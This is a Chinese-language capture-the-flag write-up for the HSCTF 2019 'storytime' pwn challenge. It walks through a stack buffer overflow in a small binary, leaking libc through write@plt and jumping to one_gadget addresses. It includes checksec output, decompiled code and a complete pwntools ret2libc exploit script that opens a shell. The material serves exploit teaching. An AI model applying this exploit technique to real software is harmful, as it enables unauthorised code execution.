---
!!! warning
    The current page still doesn't have a translation for this language.

    You can read it through google translate.

    Besides, you can also help to translate it: [Contributing](https://ctf-wiki.org/en/contribute/before-contributing/). 


title: nightmare 2.15.HS2019-storytime-wp
date: 2023-08-19 21:24:42
tags:
- CTF
- pwn
- HS2019
- stack 
- ret2libc
- nightmare
categories:
- pwn-wp
---

[相关资源](https://github.com/guyinatuxedo/nightmare/tree/master/modules/08-bof_dynamic/hs19_storytime)  

## 文件分析

文件夹包含`libc.so.6`，关于替换动态链接库，可见 https://antel0p3.github.io/2023/05/30/change_libc/

```sh
$ checksec storytime
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
$ ./storytime
HSCTF PWNNNNNNNNNNNNNNNNNNNN
Tell me a story:

```

## 代码分析

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[48]; // [rsp+0h] [rbp-30h] BYREF

  setvbuf(_bss_start, 0LL, 2, 0LL);
  write(1, "HSCTF PWNNNNNNNNNNNNNNNNNNNN\n", 0x1DuLL);
  write(1, "Tell me a story: \n", 0x12uLL);
  read(0, buf, 0x190uLL);
  return 0;
}
```

明显存在栈溢出

## 攻击方法

1. 通过调用`write@plt`（第二个参数为`write@got`）来泄露write实际地址进而获取libc基地址，输出后跳转回main待后续攻击

   注意通常只有**程序执行过**的库函数会出现在plt和got中，所以不能直接用`puts`来输出

2. 找到`one_gadget`或构造system pop链，获取shell

   one_gadget安装使用：

   ```sh
   $ apt install ruby
   $ gem install one_gadget
   
   $ one_gadget libc.so.6
   0x45216 execve("/bin/sh", rsp+0x30, environ)
   constraints:
     rax == NULL
   
   0x4526a execve("/bin/sh", rsp+0x30, environ)
   constraints:
     [rsp+0x30] == NULL
   
   0xf02a4 execve("/bin/sh", rsp+0x50, environ)
   constraints:
     [rsp+0x50] == NULL
   
   0xf1147 execve("/bin/sh", rsp+0x70, environ)
   constraints:
     [rsp+0x70] == NULL
   ```

   以上得到的地址在满足条件下可以直接执行`/bin/sh`，可以作为跳转地址，都尝试失败后就只能通过system获取shell了

## exp

```python
from pwn import *
import sys

pty = process.PTY
context(os='linux', arch='i386', log_level='debug')

mode = ''
if len(sys.argv) > 1:
    mode = sys.argv[1]

proc = process("./storytime")
libc = ELF('./libc.so.6')
belf = ELF("./storytime")

def s(x): proc.send(x)
def sl(x): return proc.sendline(x)
def sd(x): return proc.send(x)
def sla(x, y): return proc.sendlineafter(x, y)
def sa(x, y): return proc.sendafter(x, y)
def ru(x): return proc.recvuntil(x)
def rc(): return proc.recv()
def rl(): return proc.recvline()
def li(con): return log.info(con)
def ls(con): return log.success(con)
def pi(): return proc.interactive()
def pcls(): return proc.close()
def ga(): return u64(ru(b'\x7f')[-6:].ljust(8, b'\x00'))


gscript = '''
    b main
    b * 0x40069b
    c
'''
if mode == '-d':
    gdb.attach(proc, gdbscript=gscript)

ret = 0x40048e
rdi_ret = 0x400703
rsi_r15_ret = 0x400701
rax_ret = 0x33544
main = 0x40062E
gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]

payload = b'h'*0x38		# 填充到ret address
payload += p64(rdi_ret) + p64(1) 	# write(1, write@got, xxx)   第三个参数因为本身就大于write地址长度，可以不管
payload += p64(rsi_r15_ret) + p64(belf.got['write']) + p64(0)
payload += p64(belf.plt['write']) + p64(main)		# 跳转回main
sla(b'story:', payload)
# 获取libc base
libc_base = ga() - libc.sym['write']
success("libc base: " + hex(libc_base))

payload = b'h'*0x38 
payload += p64(libc_base + gadgets[0]) # 跳转执行gadgets
sla(b'story:', payload)

pi()
pause()
```
